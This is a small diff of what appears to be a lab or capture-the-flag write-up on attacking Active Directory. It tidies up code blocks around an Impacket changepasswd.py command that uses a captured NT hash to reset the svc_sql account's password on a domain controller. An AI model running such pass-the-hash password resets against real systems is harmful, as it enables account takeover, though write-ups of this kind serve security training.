@@ -342,9 +342,6 @@ We now have the **NT hash** for `svc_sql`.
 Using the NT hash to change the password:
 
 ```bash
-
-```
-```bash
 changepasswd.py darkzero.ext/svc_sql@dc02.darkzero.ext -hashes :816ccb849956b531db139346751db65f -newpass "Pa@ssw0rd123"
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
